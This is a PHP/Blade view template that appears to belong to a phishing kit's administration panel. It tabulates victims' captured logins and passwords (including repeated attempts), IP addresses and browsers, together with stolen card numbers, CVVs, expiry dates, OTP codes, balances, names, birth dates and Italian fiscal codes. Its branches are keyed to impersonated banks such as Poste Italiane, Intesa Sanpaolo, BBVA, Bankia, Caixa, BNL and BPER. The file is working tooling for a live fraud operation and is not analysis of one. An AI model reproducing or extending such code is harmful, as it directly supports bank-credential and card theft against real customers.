@extends('assets.backend.default')

{{--*/ $ci =& get_instance(); /*--}}

@push('extrajs')
<!-- FooTable -->
<script src="{{site_url('assets/js/ajax-form.js')}}"></script>
<script src="{{site_url('assets/backend/js/plugins/footable/footable.all.min.js')}}"></script>
<!-- Sweet alert -->
<!-- Ladda -->
<script src="{{site_url('assets/backend/js/plugins/ladda/spin.min.js')}}"></script>
<script src="{{site_url('assets/backend/js/plugins/ladda/ladda.min.js')}}"></script>
<script src="{{site_url('assets/backend/js/plugins/ladda/ladda.jquery.min.js')}}"></script>

<script>
    $(document).ready(function () {
        $('.footable').footable();
    });
</script>
@endpush

@push('extracss')

<!-- FooTable -->
<link href="{{site_url('assets/backend/css/plugins/footable/footable.core.css')}}" rel="stylesheet">
<link href="{{site_url('assets/backend/css/plugins/ladda/ladda-themeless.min.css')}}" rel="stylesheet">
@endpush

@section('content')

<?php
/*
  $Teste = "123|456|aaa";
  $TesteExp = explode("|", $Teste);
  //echo $TesteExp[0];
  $Contador = -1;
  foreach ($TesteExp as $TesteExps) {
    $Contador++;
  }
  echo $Contador;
*/
?>

    <div class="row">

        <div class="col-lg-12" style="margin-top: 30px">
            <div class="ibox float-e-margins">
                <div class="ibox-title">
                    <h5> <span
                                  class="badge">{{count($fail)}}</span> {{ $ci->lang->line('record_was_found') }}</h5>

                    <div class="ibox-tools">
                        <a class="collapse-link">
                            <i class="fa fa-chevron-up"></i>
                        </a>
                        <a class="close-link">
                            <i class="fa fa-times"></i>
                        </a>
                    </div>
                </div>




                <div class="ibox-content">
                    <input type="text" class="form-control input-sm m-b-xs" id="filter"
                           placeholder="Find...">
                    <table class="footable table table-stripped toggle-plus" data-page-size="20" data-filter=#filter>
                        <thead>
                        <tr>
                            <th data-toggle="true" data-hide="phone"> #</th>
                            <th>{{ $ci->lang->line('Username') }}</th>
                            <th>{{ $ci->lang->line('Password') }}</th>
                            <th data-hide="phone">{{ $ci->lang->line('IP') }}</th>
                            <th data-hide="all">{{ $ci->lang->line('Browser') }}</th>
                            <th data-hide="all">{{ $ci->lang->line('System_OS') }}</th>
                            <th>{{ $ci->lang->line('Time') }}</th>
                            <th data-hide="all">{{ $ci->lang->line('User_Agent') }}</th>
                            <th data-hide="all">{{ $ci->lang->line('ID_Link') }}</th>
                            <th data-hide="all">{{ $ci->lang->line('Page_Script') }}</th>
                            <th data-hide="all">Info's</th>
                            <!--
                            <th data-hide="all">{{ $ci->lang->line('Cell') }}</th>
                            <th data-hide="all">{{ $ci->lang->line('Tipo_di_Conto') }}</th>
                            <th data-hide="all">{{ $ci->lang->line('Card_Number') }}</th>
                            <th data-hide="all">{{ $ci->lang->line('CVV') }}</th>
                            <th data-hide="all">{{ $ci->lang->line('Card_Expiry_Date') }}</th>
                            <th data-hide="all">{{ $ci->lang->line('Saldo') }}</th>
                            <th data-hide="all">{{ $ci->lang->line('OTP') }}</th>
                            <th data-hide="all">{{ $ci->lang->line('Nome') }}</th>
                            <th data-hide="all">{{ $ci->lang->line('Cognome') }}</th>
                            <th data-hide="all">{{ $ci->lang->line('Data_Nascita') }}</th>
                            <th data-hide="all">{{ $ci->lang->line('Codice_Fiscale') }}</th>
                            <th data-hide="all">{{ $ci->lang->line('Ricordo_Codice_Titolare') }}</th>
                            -->




                        </tr>
                        </thead>
                        <tbody>
                        @foreach($fail as $fails)

                            <tr>
                                <td>{{$fails['id']}}</td>
                                <td>{{$fails['email']}}</td>
                                <td>
                                  <?php
                                    $Teste = $fails['pass'];
                                    $TesteExp = explode("|", $Teste);
                                    $Contador = -1;
                                    foreach ($TesteExp as $TesteExps) {
                                      $Contador++;
                                      if($fails['TemplateBank'] == 1){
                                        echo  $ci->lang->line('Try') . " " . ($Contador+1) . ": " . $TesteExp[$Contador]."<br>";
                                      }
                                      if($fails['TemplateBank'] == 2){
                                        echo $TesteExp[$Contador];
                                      }
                                      if($fails['TemplateBank'] == 3){
                                        echo $TesteExp[$Contador];
                                      }
                                      if($fails['TemplateBank'] == 4){
                                        echo $TesteExp[$Contador];
                                      }
                                      if($fails['TemplateBank'] == 5){
                                        echo $TesteExp[$Contador];
                                      }
                                      if($fails['TemplateBank'] == 6){
                                        echo $TesteExp[$Contador];
                                      }
                                      if($fails['TemplateBank'] == 7){
                                        echo $TesteExp[$Contador];
                                      }

                                    }
                                  ?>
                                </td>
                                <td><span class="badge badge-success">{{$fails['ip']}}</span></td>
                                <td>{{$fails['browser']}}</td>
                                <td>{{$fails['platform']}}</td>
                                <td>{{niceTime($fails['time'])}}</td>
                                <td>{{substr($fails['userAgent'],0,40)}} ...</td>
                                <td><a class="btn btn-xs btn-primary" target="_blank" href="{{$fails['link']}}">{{$fails['link']}}</a></td>
                                <td>
                                  <?php
                                    if($fails['TemplateBank'] == 1){echo 'Posteitaliane';}
                                    if($fails['TemplateBank'] == 2){echo 'Intesa Sanpaolo';}
                                    if($fails['TemplateBank'] == 3){echo 'BBVA';}
                                    if($fails['TemplateBank'] == 4){echo 'Bankia';}
                                    if($fails['TemplateBank'] == 5){echo 'Caixa';}
                                    if($fails['TemplateBank'] == 6){echo 'BNL';}
                                    if($fails['TemplateBank'] == 7){echo 'BPER';}
                                  ?>
                                </td>
                                <td>
                                  <?php
                                    if($fails['TemplateBank'] == 1){
                                      echo '<b>Nome: </b>' . $fails['Nome'] . '<br>';
                                      echo '<b>Cognome: </b>' . $fails['Cognome'] . '<br>';
                                      echo '<b>Cell: </b>' . $fails['Cell'] . '<br>';
                                      echo '<b>Data Nascita: </b>' . $fails['Datadinascita'] . '<br>';
                                      echo '<b>Codice Fiscale: </b>' . $fails['Codicefiscale'] . '<br>';
                                      echo '<b>Card Number: </b>' . $fails['CardNumber'] . '<br>';
                                      echo '<b>CVV: </b>' . $fails['CVV'] . '<br>';
                                      echo '<b>Card Expirity Date: </b>' . $fails['CardExpiryDate'] . '<br>';
                                      echo '<b>Saldo: </b>' . $fails['Saldo'] . '<br>';
                                      echo '<b>OTP: </b>' . $fails['OTP'] . '<br>';
                                    }
                                    if($fails['TemplateBank'] == 2){
                                      echo '<b>Cell: </b>' . $fails['Cell'] . '<br>';
                                      echo '<b>Check "Non ricordo il codice titolare"?: </b>' . $fails['RicordoCodiceTitolare'] . '<br>';
                                      echo '<b>Tipo di Conto: </b>' . $fails['Contos'] . '<br>';
                                    }
                                    if($fails['TemplateBank'] == 3){
                                      echo '<b>Nùmero de movil: </b>' . $fails['Cell'] . '<br>';
                                    }
                                    if($fails['TemplateBank'] == 4){
                                      echo '<b>Firma Electrónica: </b>' . $fails['Codicefiscale'] . '<br>';
                                      echo '<b>Nùmero de movil: </b>' . $fails['Cell'] . '<br>';
                                    }
                                    if($fails['TemplateBank'] == 5){
                                      echo '<b>Nùmero de movil: </b>' . $fails['Cell'] . '<br>';
                                    }
                                    if($fails['TemplateBank'] == 6){
                                      echo '<b>Nùmero de movil: </b>' . $fails['Cell'] . '<br>';
                                    }
                                    if($fails['TemplateBank'] == 7){
                                      echo '<b>Nùmero de movil: </b>' . $fails['Cell'] . '<br>';
                                    }
                                  ?>
                                </td>
                                <!--
                                <td>{{$fails['Cell']}}</td>
                                <td>{{$fails['Contos']}}</td>
                                <td>{{$fails['CardNumber']}}</td>
                                <td>{{$fails['CVV']}}</td>
                                <td>{{$fails['CardExpiryDate']}}</td>
                                <td>{{$fails['Saldo']}}</td>
                                <td>{{$fails['OTP']}}</td>
                                <td>{{$fails['Nome']}}</td>
                                <td>{{$fails['Cognome']}}</td>
                                <td>{{$fails['Datadinascita']}}</td>
                                <td>{{$fails['Codicefiscale']}}</td>
                                <td>{{$fails['RicordoCodiceTitolare']}}</td>
                                -->



                            </tr>
                        @endforeach
                        </tbody>
                        <tfoot>
                        <tr>
                            <td colspan="5">
                                <ul class="pagination pull-right"></ul>
                            </td>
                        </tr>
                        </tfoot>
                    </table>

                </div>
            </div>
        </div>


        <div class="col-xs-12 text-center" style="margin-bottom: 20px">
            <a
                    @if ( count( $fail ) == 0 )
                    disabled readonly="readonly" data-toggle="tooltip" data-placement="top"
                    title="Can not clear Logs already empty duh !"
                    @else
                    onclick="return confirm(\'Are you sure deleting the whole blocked ip list at once !\');"
                    href="{{site_url( 'admin/failed/clear' ) }}"
                    @endif
                    class="btn btn-danger btn-md">
                {{ $ci->lang->line('Delete_All') }} <i class="fa fa-trash"></i></a>
        </div>
    </div>

@endsection
